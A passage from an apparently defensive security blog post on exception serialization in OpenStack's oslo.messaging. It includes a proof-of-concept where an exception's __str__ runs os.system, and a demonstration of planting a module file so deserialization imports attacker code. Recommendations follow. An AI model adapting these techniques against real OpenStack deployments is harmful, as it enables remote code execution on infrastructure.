</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(random<span style=color:#f92672>.</span>uniform(<span style=color:#ae81ff>0.001</span>, <span style=color:#ae81ff>0.003</span>))  <span style=color:#75715e># 1ms ~ 3ms delay</span>
</span></span><span style=display:flex><span>        hit_count <span style=color:#f92672>=</span> local_count <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Thread </span><span style=color:#e6db74>{</span>threading<span style=color:#f92672>.</span>current_thread()<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74> set hit_count=</span><span style=color:#e6db74>{</span>hit_count<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;touch /tmp/hacked_race_</span><span style=color:#e6db74>{</span>hit_count<span style=color:#e6db74>}</span><span style=color:#e6db74>_thread_</span><span style=color:#e6db74>{</span>threading<span style=color:#f92672>.</span>current_thread()<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;boom_</span><span style=color:#e6db74>{</span>hit_count<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>deserializer</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> hit_count
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> hit_count <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>:
</span></span><span style=display:flex><span>        ex <span style=color:#f92672>=</span> Boom()
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Thread </span><span style=color:#e6db74>{</span>threading<span style=color:#f92672>.</span>current_thread()<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74> created Boom&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            ex_queue<span style=color:#f92672>.</span>put(ex, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.1</span>)
</span></span><span style=display:flex><span>            time<span style=color:#f92672>.</span>sleep(random<span style=color:#f92672>.</span>uniform(<span style=color:#ae81ff>0.001</span>, <span style=color:#ae81ff>0.003</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> queue<span style=color:#f92672>.</span>Full:
</span></span><span style=display:flex><span>            time<span style=color:#f92672>.</span>sleep(random<span style=color:#f92672>.</span>uniform(<span style=color:#ae81ff>0.001</span>, <span style=color:#ae81ff>0.003</span>))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>serializer</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> hit_count
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> hit_count <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            ex <span style=color:#f92672>=</span> ex_queue<span style=color:#f92672>.</span>get(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.3</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Thread </span><span style=color:#e6db74>{</span>threading<span style=color:#f92672>.</span>current_thread()<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74> got Boom, calling str&#34;</span>)
</span></span><span style=display:flex><span>            str(ex)  <span style=color:#75715e># Triggers Boom.__str__</span>
</span></span><span style=display:flex><span>            time<span style=color:#f92672>.</span>sleep(random<span style=color:#f92672>.</span>uniform(<span style=color:#ae81ff>0.001</span>, <span style=color:#ae81ff>0.003</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> Queue<span style=color:#f92672>.</span>Empty:
</span></span><span style=display:flex><span>            time<span style=color:#f92672>.</span>sleep(random<span style=color:#f92672>.</span>uniform(<span style=color:#ae81ff>0.001</span>, <span style=color:#ae81ff>0.003</span>))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Minimal thread setup</span>
</span></span><span style=display:flex><span>threads <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>deserializer, name<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Deserializer-</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>] <span style=color:#f92672>+</span> [
</span></span><span style=display:flex><span>    threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>serializer, name<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Serializer-</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> t <span style=color:#f92672>in</span> threads:
</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> t <span style=color:#f92672>in</span> threads:
</span></span><span style=display:flex><span>    t<span style=color:#f92672>.</span>join(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Final hit_count:&#34;</span>, hit_count)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Generated files:&#34;</span>, sorted([f <span style=color:#66d9ef>for</span> f <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>listdir(<span style=color:#e6db74>&#34;/tmp&#34;</span>) <span style=color:#66d9ef>if</span> f<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;hacked_race_&#34;</span>)]))
</span></span></code></pre></div><hr><h2 id=openstack-specific-vulnerability-context><strong>OpenStack-specific Vulnerability Context</strong><a hidden class=anchor aria-hidden=true href=#openstack-specific-vulnerability-context>#</a></h2><p>The vulnerable functions <code>serialize_remote_exception()</code> and <code>deserialize_remote_exception()</code> are part of the <code>oslo.messaging</code> library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in <code>oslo_messaging/_drivers/common.py</code> and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.</p><h3 id=serialize_remote_exception><strong>serialize_remote_exception()</strong><a hidden class=anchor aria-hidden=true href=#serialize_remote_exception>#</a></h3><p>This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls <code>str(failure)</code>, which is the same as <code>str(ex)</code>. If the exception object has an overridden <code>__str__()</code> method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;class&#39;</span>: cls_name,
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;module&#39;</span>: mod_name,
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;message&#39;</span>: str(failure),
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;tb&#39;</span>: tb,
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;args&#39;</span>: failure<span style=color:#f92672>.</span>args,
</span></span><span style=display:flex><span>   <span style=color:#e6db74>&#39;kwargs&#39;</span>: kwargs
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=deserialize_remote_exception><strong>deserialize_remote_exception()</strong><a hidden class=anchor aria-hidden=true href=#deserialize_remote_exception>#</a></h3><p>This function dynamically imports and reconstructs exception classes from RPC responses. It uses the <code>module</code> and <code>class</code> fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via <code>allowed_remote_exmods</code>, any misconfiguration or unsafe exception content (such as crafted <code>__str__()</code> methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>_EXCEPTIONS_MODULE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;builtins&#39;</span>
</span></span><span style=display:flex><span>_EXCEPTIONS_MODULES <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;exceptions&#39;</span>, <span style=color:#e6db74>&#39;builtins&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> module <span style=color:#f92672>in</span> _EXCEPTIONS_MODULES:
</span></span><span style=display:flex><span>   module <span style=color:#f92672>=</span> _EXCEPTIONS_MODULE
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> module <span style=color:#f92672>!=</span> _EXCEPTIONS_MODULE <span style=color:#f92672>and</span> module <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> allowed_remote_exmods:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> RemoteError(name, message, traceback)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mod <span style=color:#f92672>=</span> importutils<span style=color:#f92672>.</span>import_module(module)
</span></span><span style=display:flex><span>klass <span style=color:#f92672>=</span> getattr(mod, name)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> issubclass(klass, <span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>TypeError</span>(<span style=color:#f92672>...</span>)
</span></span><span style=display:flex><span>exc <span style=color:#f92672>=</span> klass(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)
</span></span></code></pre></div><p>These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.</p><hr><h3 id=openstack-products-and-custom-exception-namespaces><strong>OpenStack Products and Custom Exception Namespaces</strong><a hidden class=anchor aria-hidden=true href=#openstack-products-and-custom-exception-namespaces>#</a></h3><p>In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>allowed_exception_namespaces <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;ironic_lib.exception.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;ironic.common.exception.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;ironic_inspector.utils.&#39;</span>
</span></span><span style=display:flex><span>]
</span></span></code></pre></div><p>See: <a href=https://docs.openstack.org/ironic-lib/wallaby/reference/api/ironic_lib.json_rpc.html>Ironic JSON RPC Reference</a></p><p>Due to Python&rsquo;s import path resolution, if a local file exists that matches the expected module path (e.g., <code>ironic/common/exception.py</code>), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> ironic.common <span style=color:#f92672>import</span> exception
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> oslo_messaging._drivers <span style=color:#f92672>import</span> common <span style=color:#66d9ef>as</span> exceptions
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;class&#34;: &#34;MyException&#34;, &#34;module&#34;: &#34;ironic.common.exception&#34;, &#34;message&#34;: &#34;</span><span style=color:#ae81ff>\uc5d0\ub7ec</span><span style=color:#e6db74>: test&#34;, &#34;tb&#34;: [&#34;MyException: </span><span style=color:#ae81ff>\uc5d0\ub7ec</span><span style=color:#e6db74>: test</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;], &#34;args&#34;: [&#34;test&#34;], &#34;kwargs&#34;: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>}&#39;</span>
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;ironic.common.exception&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#75715e># &lt;module &#39;ironic.common.exception&#39; from &#39;./ironic/common/exception.py&#39;&gt;</span>
</span></span><span style=display:flex><span>exceptions<span style=color:#f92672>.</span>deserialize_remote_exception(e,[<span style=color:#e6db74>&#39;ironic.common.exception&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#75715e># execute init</span>
</span></span><span style=display:flex><span><span style=color:#75715e># MyException_Remote(&#39;test&#39;)</span>
</span></span></code></pre></div><p>Contents of ironic/common/exception.py:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MyException</span>(<span style=color:#a6e22e>Exception</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, msg):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;execute init&#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>msg <span style=color:#f92672>=</span> msg
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __str__(self):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;execute str&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;error: </span><span style=color:#e6db74>{</span>self<span style=color:#f92672>.</span>msg<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MyException(<span style=color:#e6db74>&#34;test&#34;</span>)
</span></span></code></pre></div><p>This demonstrates that deserialization can instantiate attacker-controlled exception classes if the import path can be influenced or a malicious file is present locally.</p><hr><h2 id=challenges-to-exploitation><strong>Challenges to Exploitation</strong><a hidden class=anchor aria-hidden=true href=#challenges-to-exploitation>#</a></h2><ul><li><p>Requires access to the message broker (e.g., RabbitMQ)</p></li><li><p>Tainted exception object must survive to a point where it is formatted</p></li><li><p>Only classes in <code>allowed_remote_exmods</code> can be instantiated</p></li><li><p>Many logging systems use <code>exc_info=True</code>, avoiding <code>str(e)</code></p></li></ul><p>However, misconfigured systems, improper logging, or overbroad whitelisting may create a realistic attack path.</p><hr><h2 id=recommendations><strong>Recommendations</strong><a hidden class=anchor aria-hidden=true href=#recommendations>#</a></h2><ul><li><p>Strictly define and audit <code>allowed_remote_exmods</code></p></li><li><p>Never <code>str()</code> or <code>repr()</code> exception objects directly in logs</p></li><li><p>Prefer logging frameworks with <code>exc_info=True</code></p></li><li><p>Sanitize all exception message content</p></li><li><p>Use <code>RemoteError</code> as a fallback to avoid importing user-defined classes</p></li><li><p>Review thread concurrency behaviors in RPC exception handling paths</p></li></ul><hr><h2 id=related-references-and-resources><strong>Related References and Resources</strong><a hidden class=anchor aria-hidden=true href=#related-references-and-resources>#</a></h2><ul><li><p><strong>OpenStack Trove RPC Security Specification</strong><br><a href=https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html>https://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html</a></p></li><li><p><strong>ZeroMQ Removal of Pickle Support (Launchpad bug)</strong><br><a href=https://bugs.launchpad.net/bugs/1582207>https://bugs.launchpad.net/bugs/1582207</a></p></li><li><p><strong>OpenStack Security Guidelines: Avoid Dangerous Input Parsing Libraries</strong><br><a href=https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html>https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html</a></p></li></ul><hr><h2 id=conclusion><strong>Conclusion</strong><a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>This analysis demonstrates that certain exception serialization and deserialization patterns could, in theory, result in code execution if all other safeguards fail. However, the exploitability is limited by real-world constraints and OpenStack&rsquo;s layered defenses. The primary goal of this report is to help readers recognize and avoid insecure exception handling patterns, not to suggest that OpenStack is practically vulnerable to RCE via these mechanisms. Learning from these anti-patterns will help improve the security posture of distributed Python applications.</p><p>Future work should explore automated tooling to detect vulnerable flows and validate exploit feasibility in controlled OpenStack environments.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://windshock.github.io/en/tags/openstack/>OpenStack</a></li><li><a href=https://windshock.github.io/en/tags/nova/>Nova</a></li><li><a href=https://windshock.github.io/en/tags/rce/>RCE</a></li><li><a href=https://windshock.github.io/en/tags/vulnerability-analysis/>Vulnerability Analysis</a></li><li><a href=https://windshock.github.io/en/tags/oslo.messaging/>Oslo.messaging</a></li><li><a href=https://windshock.github.io/en/tags/exception-serialization/>Exception Serialization</a></li></ul><nav class=paginav><a class=prev href=https://windshock.github.io/en/post/2025-06-25-ssrf-defense/><span class=title>« Prev</span><br><span>The Limitations of 'Secure' SSRF Patches: Advanced Bypasses and Defense-in-Depth</span>
</a><a class=next href=https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/><span class=title>Next »</span><br><span>Endpoint Evasion Techniques (2020–2025): The Evolution of Attacks Bypassing EDR</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on x" href="https://x.com/intent/tweet/?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;hashtags=OpenStack%2cNova%2cRCE%2cVulnerabilityAnalysis%2coslo.messaging%2cExceptionSerialization"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;summary=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;source=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on whatsapp" href="https://api.whatsapp.com/send?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned%20-%20https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on telegram" href="https://telegram.me/share/url?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on ycombinator" href="https://news.ycombinator.com/submitlink?t=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&u=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://windshock.github.io/en/>Code Before Breach</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
